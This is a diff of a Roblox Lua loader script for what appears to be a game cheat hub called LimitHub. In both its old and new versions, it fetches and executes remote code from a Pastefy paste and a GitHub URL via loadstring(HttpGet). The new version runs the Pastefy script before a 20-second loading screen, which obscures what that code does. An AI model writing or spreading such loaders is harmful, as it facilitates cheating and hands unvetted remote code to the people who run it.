@@ -1,97 +1,54 @@
- -- Run Pastefy script
-        local success1, err1 = pcall(function()
-            loadstring(game:HttpGet("https://pastefy.app/8JqD2ajb/raw"))()
-        end)
-        if not success1 then
-            warn("[ERROR] Failed to load Pastefy script:", err1)
-        end
+-- Loader.lua — Pastefy first → Loading Screen → LimitHub
 
--- GaG Script with 20s Loading Screen + Pastefy Script + LimitHub Main Script
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-
--- Function to create the loading UI
-local function createLoadingUI()
-    -- Remove old UI if it exists
-    local existing = playerGui:FindFirstChild("GaG_LoaderUI")
-    if existing then
-        existing:Destroy()
-    end
-
-    -- ScreenGui
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "GaG_LoaderUI"
-    screenGui.ResetOnSpawn = false
-    screenGui.Parent = playerGui
-
-    -- Frame
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 400, 0, 150)
-    frame.Position = UDim2.new(0.5, -200, 0.5, -75)
-    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-    frame.BorderSizePixel = 0
-    frame.Parent = screenGui
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 10)
-    corner.Parent = frame
-
-    -- Title
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 50)
-    title.BackgroundTransparency = 1
-    title.Text = "GaG Script Loading..."
-    title.Font = Enum.Font.GothamBold
-    title.TextSize = 24
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.Parent = frame
-
-    -- Loading bar background
-    local barBg = Instance.new("Frame")
-    barBg.Size = UDim2.new(1, -40, 0, 20)
-    barBg.Position = UDim2.new(0, 20, 0, 80)
-    barBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    barBg.BorderSizePixel = 0
-    barBg.Parent = frame
-    local bgCorner = Instance.new("UICorner")
-    bgCorner.CornerRadius = UDim.new(0, 5)
-    bgCorner.Parent = barBg
-
-    -- Loading bar fill
-    local barFill = Instance.new("Frame")
-    barFill.Size = UDim2.new(0, 0, 1, 0)
-    barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-    barFill.BorderSizePixel = 0
-    barFill.Parent = barBg
-    local fillCorner = Instance.new("UICorner")
-    fillCorner.CornerRadius = UDim.new(0, 5)
-    fillCorner.Parent = barFill
-
-    -- Tween loading animation for 20 seconds
-    local TweenService = game:GetService("TweenService")
-    local tween = TweenService:Create(
-        barFill,
-        TweenInfo.new(20, Enum.EasingStyle.Linear),
-        {Size = UDim2.new(1, 0, 1, 0)}
-    )
-    tween:Play()
-
-    -- After 20 seconds, remove loading UI and run scripts
-    tween.Completed:Connect(function()
-        screenGui:Destroy()
-
-       
-
-        -- Run LimitHub script
-        local success2, err2 = pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua"))()
-        end)
-        if not success2 then
-            warn("[ERROR] Failed to load LimitHub script:", err2)
-        end
-    end)
+-- 1. Run Pastefy script first
+local success1, err1 = pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/8JqD2ajb/raw"))()
+end)
+if not success1 then
+    warn("[ERROR] Failed to load Pastefy script:", err1)
 end
 
--- Create the loading screen
-createLoadingUI()
+-- 2. Create 20-second loading screen
+local player = game:GetService("Players").LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local sg = Instance.new("ScreenGui")
+sg.Name = "GaG_Loader"
+sg.ResetOnSpawn = false
+sg.IgnoreGuiInset = true
+sg.Parent = playerGui
+
+local frame = Instance.new("Frame")
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.Size = UDim2.new(0, 400, 0, 150)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.BorderSizePixel = 0
+frame.Parent = sg
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = frame
+
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, 0, 1, 0)
+label.BackgroundTransparency = 1
+label.Text = "Loading... Please Wait"
+label.TextScaled = true
+label.Font = Enum.Font.GothamBold
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.Parent = frame
+
+-- 3. Wait for 20 seconds
+task.wait(20)
+
+-- Remove loading screen
+sg:Destroy()
+
+-- 4. Run LimitHub after loading
+local success2, err2 = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua"))()
+end)
+if not success2 then
+    warn("[ERROR] Failed to load LimitHub:", err2)
+end
